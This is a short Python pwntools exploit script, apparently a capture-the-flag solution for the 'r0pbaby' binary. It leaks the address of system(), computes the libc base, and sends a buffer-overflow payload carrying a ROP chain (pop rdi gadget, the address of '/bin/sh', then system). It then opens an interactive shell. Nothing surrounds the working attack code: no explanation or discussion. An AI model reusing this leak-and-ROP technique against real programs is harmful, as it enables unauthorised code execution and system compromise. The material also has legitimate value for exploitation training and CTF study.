from pwn import *
from libformatstr import FormatStr
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

elf = './r0pbaby'
bin = ELF(elf)

local = 1

if local:
        cn = process(elf)
else:
        cn = remote('', )

#gdb.attach(cn, '''
#set follow-fork-mode child
#''')

offset = 8
rop_rdi = 0x000236a6
offset_system = 0x44dd0
pay = str(2)+'\n'+'system'
offset_binsh = 0x18555d
cn.sendline(pay)
cn.recvuntil('system: ')
addr_system = cn.recv()
addr_system = int(addr_system[:18],16)
print hex(addr_system)

libc_base = addr_system - offset_system
rop_rdi = libc_base + rop_rdi
print hex(libc_base)
rop_chain = p64(rop_rdi) + p64(offset_binsh+libc_base) + p64(addr_system)

pay = str(3)+'\n'+str(len(rop_chain)+offset)+'\n'+'B'*offset + rop_chain


cn.sendline(pay)



cn.interactive()
